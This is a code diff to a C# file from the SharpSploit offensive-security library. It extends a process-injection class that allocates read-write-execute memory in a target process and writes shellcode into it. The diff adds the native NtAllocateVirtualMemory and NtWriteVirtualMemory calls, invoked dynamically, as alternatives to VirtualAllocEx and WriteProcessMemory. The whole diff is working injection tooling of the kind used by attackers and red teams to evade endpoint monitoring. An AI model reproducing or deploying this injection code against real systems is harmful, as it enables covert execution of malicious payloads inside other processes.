@@ -1,7 +1,8 @@
-﻿using System;
+using System;
 using System.Linq;
 using System.Reflection;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace SharpSploit.Execution.Injection
 {
@@ -291,12 +292,27 @@ namespace SharpSploit.Execution.Injection
     /// <summary>
     /// Allocates a payload to a target process using VirtualAllocateEx and WriteProcessMemory
     /// </summary>
+    /// <author>aus</author>
     public class VirtualAllocate : AllocationTechnique
     {
         // Publically accessible options
 
         public Win32.Kernel32.AllocationType allocationType = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit);
         public Win32.Kernel32.MemoryProtection memoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite;
+        public AllocAPIS allocAPI = AllocAPIS.VirtualAllocEx;
+        public WriteAPIS writeAPI = WriteAPIS.WriteProcessMemory;
+
+        public enum AllocAPIS : int
+        {
+            VirtualAllocEx = 0,
+            NtAllocateVirtualMemory = 1
+        };
+
+        public enum WriteAPIS : int
+        {
+            WriteProcessMemory = 0,
+            NtWriteVirtualMemory = 1
+        };
 
         /// <summary>
         /// Default constructor.
@@ -311,11 +327,15 @@ namespace SharpSploit.Execution.Injection
         /// </summary>
         public VirtualAllocate(
             Win32.Kernel32.AllocationType alloctype = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit),
-            Win32.Kernel32.MemoryProtection memprotect = Win32.Kernel32.MemoryProtection.ExecuteReadWrite)
+            Win32.Kernel32.MemoryProtection memprotect = Win32.Kernel32.MemoryProtection.ExecuteReadWrite,
+            AllocAPIS alloc = AllocAPIS.VirtualAllocEx,
+            WriteAPIS write = WriteAPIS.WriteProcessMemory)
         {
             DefineSupportedPayloadTypes();
             allocationType = alloctype;
             memoryProtection = memprotect;
+            allocAPI = alloc;
+            writeAPI = write;
         }
 
         /// <summary>
@@ -366,25 +386,51 @@ namespace SharpSploit.Execution.Injection
         /// <param name="Process">The target process.</param>
         /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
         /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
+        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress = new IntPtr())
         {
             // Get a convenient handle for the target process.
             IntPtr procHandle = Process.Handle;
 
             // Allocate some memory
-            IntPtr regionAddress = DynamicInvoke.Win32.VirtualAllocEx(procHandle, PreferredAddress, (uint)Payload.Payload.Length, allocationType, memoryProtection);
+            IntPtr regionAddress = PreferredAddress;
 
-            if (regionAddress == IntPtr.Zero)
+            if (allocAPI == AllocAPIS.VirtualAllocEx)
             {
-                throw new AllocationFailed(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+                regionAddress = DynamicInvoke.Win32.VirtualAllocEx(procHandle, PreferredAddress, (uint)Payload.Payload.Length, allocationType, memoryProtection);
+
+                if (regionAddress == IntPtr.Zero)
+                {
+                    throw new AllocationFailed(Marshal.GetLastWin32Error());
+                }
             }
 
-            // Copy the shellcode to allocated memory
-            bool retVal = DynamicInvoke.Win32.WriteProcessMemory(procHandle, regionAddress, Payload.Payload, (Int32)Payload.Payload.Length, out IntPtr bytesWritten);
-
-            if (!retVal)
+            else if (allocAPI == AllocAPIS.NtAllocateVirtualMemory)
             {
-                throw new MemoryWriteFailed(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+                IntPtr regionSize = new IntPtr(Payload.Payload.Length);
+
+                DynamicInvoke.Native.NtAllocateVirtualMemory(procHandle, ref regionAddress, IntPtr.Zero, ref regionSize, (uint) allocationType, (uint) memoryProtection);
+
+            }
+
+            if (writeAPI == WriteAPIS.WriteProcessMemory)
+            {
+                // Copy the shellcode to allocated memory
+                bool retVal = DynamicInvoke.Win32.WriteProcessMemory(procHandle, regionAddress, Payload.Payload, (Int32)Payload.Payload.Length, out IntPtr bytesWritten);
+
+                if (!retVal)
+                {
+                    throw new MemoryWriteFailed(Marshal.GetLastWin32Error());
+                }
+            }
+            else if (writeAPI == WriteAPIS.NtWriteVirtualMemory)
+            {
+                GCHandle handle = GCHandle.Alloc(Payload.Payload, GCHandleType.Pinned);
+                IntPtr payloadPtr = handle.AddrOfPinnedObject();
+
+                uint BytesWritten = DynamicInvoke.Native.NtWriteVirtualMemory(procHandle, regionAddress, payloadPtr, (uint)Payload.Payload.Length);
+
+                if (BytesWritten != (uint)Payload.Payload.Length)
+                    throw new MemoryWriteFailed(0);
             }
 
             return regionAddress;
